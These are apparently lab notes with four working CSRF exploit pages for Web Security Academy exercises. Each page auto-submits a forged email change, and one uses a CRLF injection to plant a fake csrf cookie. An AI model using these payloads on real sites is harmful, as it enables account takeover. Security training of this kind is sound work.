CSRF TOKEN NOT TIED TO SINGLE SESSION COOKIE
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@gothacked">
            <input required type="hidden" name="csrf" value="CSRF">
            <button type="submit">Update Email</button>
        </form>
        <script>document.forms[0].submit()</script>
    </body>
</html>
```

CSRF TOKEN IS VALIDATED ONLY IF PRESENT, IF OMITTED THERE IS NO CONTROL
```html
<html>
    <body>
        <form action="https://0ab000a5048fb98c8049676b00d00054.web-security-academy.net/my-account/change-email" method="POST">
        <input required type="email" name="email" value="victim@yougothacked">
        <button type="submit">Update email</button>
    <script>document.forms[0].submit()</script>
    </body>
</html>
```

CSRF TOKEN CONTROL IS IMPLEMENTED ONLY ON POST REQUEST, SWITCHING TO GET METHOD AND STRIPPING THE CSRF PARAMETER FROM THE URL DOES BYPASS THE CONTROL
```html
<html>
    <body>
        <img src="https://0a68008a048967758029fd920081006d.web-security-academy.net/my-account/change-email?email=victim%40gothacked" onerror=alert(1)>
    </body>
</html>
```

CSRF TOKEN CONTROL DUPLICATED IN A COOKIE AND SOME USER INPUT IS REFLECTED IN THE SET-COOKIE HEADER
```html
<html>
    <body>
        <img src="URL/?search=test%0D%0ASet-Cookie%3A%20csrf%3Dfakecsrf%3B%20SameSite%3DNone" onerror=document.forms[0].submit()>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@yougothacked">
            <input required type="hidden" name="csrf" value="fakecsrf">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>
```
